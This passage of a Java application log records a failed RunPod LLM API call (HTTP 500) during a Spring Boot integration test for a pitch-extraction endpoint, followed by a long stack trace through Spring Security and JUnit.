solution\n---\n\nRespond ONLY with a valid JSON object in this exact format (no markdown, no explanation):\n{\n    \"title\": \"string or null\",\n    \"problemStatement\": \"string or null\",\n    \"solution\": \"string or null\",\n    \"rabbitHoles\": \"string or null\",\n    \"risks\": \"string or null\",\n    \"noGos\": \"string or null\",\n    \"appetiteDays\": number or null,\n    \"wireframeLinks\": \"string or null\"\n}\n"}}
2026-01-17T23:26:45.001Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:45.001228","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:45.001228","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchShapingExtractorService.extractFromDocument(PitchShapingExtractorService.java:114) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentController.extractPitchDataFromDocument(DocumentController.java:247) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:914) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest.extractPitchData_withSaveDocument_shouldReturnDocumentId(DocumentControllerIntegrationTest.java:300) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
